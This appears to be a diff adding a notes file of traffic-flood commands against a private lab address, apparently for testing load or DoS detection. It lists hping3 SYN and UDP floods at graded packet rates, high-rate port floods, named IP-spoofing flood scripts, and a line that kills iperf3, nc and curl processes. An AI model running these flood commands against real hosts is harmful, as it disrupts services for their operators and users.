@@ -1,0 +1,17 @@
+L1 (100pps) => hping3 -S -q -s 1000 -p 12545 -k -i u10000 10.0.5.11 
+               hping3 --udp -q -s 1000 -p 12545 -k -i u10000 10.0.5.11  
+L2 (250pps) => hping3 -S -q -s 1000 -p 12545 -k -i u4000 10.0.5.11 
+               hping3 --udp -q -s 1000 -p 12545 -k -i u4000 10.0.5.11  
+L3 (450pps) => hping3 -S -q -s 1000 -p 12545 -k -i u2200 10.0.5.11 
+               hping3 --udp -q -s 1000 -p 12545 -k -i u2200 10.0.5.11  
+L4 (600pps) => hping3 -S -q -s 1000 -p 12545 -k -i u1600 10.0.5.11 
+               hping3 --udp -q -s 1000 -p 12545 -k -i u1600 10.0.5.11  
+
+IP Spoofing => udp_flood.py
+               ping_flood.py
+               tcp_flood.py
+
+Port Flood =>  hping3 -q --udp -s 1000 -p 80 -i u100 10.0.5.11 
+               hping3 -q --udp -s 1000 -k -p ++1024 -i u100 10.0.5.11 
+
+Kill porcesses => sudo killall -9 iperf3 nc python3 curl
